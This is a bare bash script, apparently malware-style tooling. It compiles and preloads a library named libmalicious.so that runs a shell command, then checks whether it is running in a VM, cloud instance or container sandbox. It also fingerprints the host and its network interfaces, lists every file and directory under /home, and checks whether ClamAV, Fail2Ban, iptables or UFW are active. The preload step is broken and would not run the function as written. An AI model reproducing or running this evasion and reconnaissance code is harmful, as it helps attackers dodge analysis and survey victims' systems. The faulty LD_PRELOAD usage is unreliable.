#!/bin/bash
gcc -shared -o libmalicious.so -fPIC <(echo "void malicious_function() { system(\"touch /tmp/malicious_file\"); }")
LD_PRELOAD="./libmalicious.so" bash -c "malicious_function"
if [ -f /proc/vz ] || [ -f /proc/bc ]; then
    printf "Virtualization detected: OpenVZ or Virtuozzo\n"
elif [ -f /proc/xen ]; then
    printf "Virtualization detected: Xen\n"
elif [ -f /sys/hypervisor/uuid ] && grep -q ec2 /sys/hypervisor/uuid; then
    printf "Virtualization detected: Amazon EC2\n"
elif [ -f /sys/class/dmi/id/product_name ] && grep -q VMware /sys/class/dmi/id/product_name; then
    printf "Virtualization detected: VMware\n"
elif [ -f /sys/class/dmi/id/sys_vendor ] && grep -q VMware /sys/class/dmi/id/sys_vendor; then
    printf "Virtualization detected: VMware\n"
elif [ -f /proc/scsi/scsi ] && grep -q VMware /proc/scsi/scsi; then
    printf "Virtualization detected: VMware\n"
elif [ -f /sys/class/dmi/id/product_name ] && grep -q VirtualBox /sys/class/dmi/id/product_name; then
    printf "Virtualization detected: VirtualBox\n"
elif [ -f /sys/class/dmi/id/sys_vendor ] && grep -q VirtualBox /sys/class/dmi/id/sys_vendor; then
    printf "Virtualization detected: VirtualBox\n"
elif [ -f /proc/vboxdrv ]; then
    printf "Virtualization detected: VirtualBox\n"
elif [ -f /proc/self/cgroup ] && grep -q docker /proc/self/cgroup; then
    printf "Container detected: Docker\n"
else
    printf "No virtualization or sandbox environment detected\n"
fi
if grep -q 'VirtualBox' /sys/class/dmi/id/product_name; then
    printf "Virtual Environment Detected: VirtualBox\n"
elif grep -q 'VMware' /sys/class/dmi/id/product_name; then
    printf "Virtual Environment Detected: VMware\n"
elif grep -q 'KVM' /sys/class/dmi/id/product_name; then
    printf "Virtual Environment Detected: KVM\n"
elif grep -q 'QEMU' /sys/class/dmi/id/product_name; then
    printf "Virtual Environment Detected: QEMU\n"
else
    printf "No Virtual Environment Detected\n"
fi
hostname=$(hostname)
os_version=$(lsb_release -ds)
network_interfaces=$(ip addr show)
printf "Hostname: %s\n" "$hostname"
printf "OS Version: %s\n" "$os_version"
printf "Network Interfaces:\n%s\n" "$network_interfaces"
TARGET_PATH="/home"
find "$TARGET_PATH" -type d > directories.txt
find "$TARGET_PATH" -type f > files.txt
if pgrep -x "clamav-daemon" > /dev/null; then
    printf "ClamAV is running\n"
fi
if pgrep -x "fail2ban-server" > /dev/null; then
    printf "Fail2Ban is running\n"
fi
if pgrep -x "iptables" > /dev/null; then
    printf "IPTables is running\n"
fi
if pgrep -x "ufw" > /dev/null; then
    printf "UFW is running\n"
fi